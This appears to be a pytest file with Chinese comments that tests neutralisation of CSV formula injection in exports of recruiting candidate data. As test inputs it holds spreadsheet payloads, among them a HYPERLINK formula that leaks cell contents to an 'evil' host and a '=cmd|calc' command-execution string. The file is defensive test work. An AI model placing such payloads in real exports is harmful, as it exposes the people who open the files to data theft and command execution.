"""CSV 公式注入防护测试.

背景 (2026-10-08 审查 F-17):
    csv.writer 只转义分隔符与引号, 不阻止 Excel 把 `=` `+` `-` `@` TAB CR 开头的
    单元格当公式执行。候选人姓名/公司/职位均为用户可控内容, 导出即形成攻击面。
"""
import csv
import io

import pytest

from apps.common.csv_safe import (
    SafeCsvDictWriter,
    SafeCsvWriter,
    csv_safe,
    csv_safe_row,
)


@pytest.mark.parametrize('value', [
    '=1+1',
    '=HYPERLINK("http://evil/?d="&A1,"点击查看")',
    '+1234',
    '-2+3',
    '@SUM(A1:A9)',
    '\t=cmd',
    '\r=cmd',
])
def test_formula_prefixes_neutralized(value):
    """所有会被当公式的前缀都必须被前置单引号破坏。"""
    out = csv_safe(value)
    assert out.startswith("'"), f'{value!r} 未被中和: {out!r}'


@pytest.mark.parametrize('value', [
    '张三',
    'Acme  corporation',
    '',
    '正常-中间有连字符',
    '价格=100',
])
def test_normal_values_untouched(value):
    """普通文本不得被改动 (前缀才处理, 中间出现的字符不管)。"""
    assert csv_safe(value) == value


@pytest.mark.parametrize('value', [None, 123, 45.6, True, False])
def test_non_strings_pass_through(value):
    assert csv_safe(value) is value


def test_row_helper():
    assert csv_safe_row(['张三', '=1+1', 3]) == ['张三', "'=1+1", 3]


def test_writer_neutralizes_cells():
    buf = io.StringIO()
    w = SafeCsvWriter(buf)
    w.writerow(['姓名', '当前公司'])
    w.writerow(['张三', '=cmd|calc'])
    content = buf.getvalue()
    assert "'=cmd|calc" in content
    # 仍能正确解析回两行两列
    rows = list(csv.reader(io.StringIO(content)))
    assert rows[1] == ['张三', "'=cmd|calc"]


def test_dict_writer_neutralizes_values():
    buf = io.StringIO()
    w = SafeCsvDictWriter(buf, fieldnames=['name', 'company'])
    w.writeheader()
    w.writerows([{'name': '李四', 'company': '@SUM(A1)'}])
    assert "'@SUM(A1)" in buf.getvalue()


def test_writerows_batch():
    buf = io.StringIO()
    SafeCsvWriter(buf).writerows([['=a'], ['+b'], ['ok']])
    content = buf.getvalue()
    assert "'=a" in content and "'+b" in content and 'ok' in content
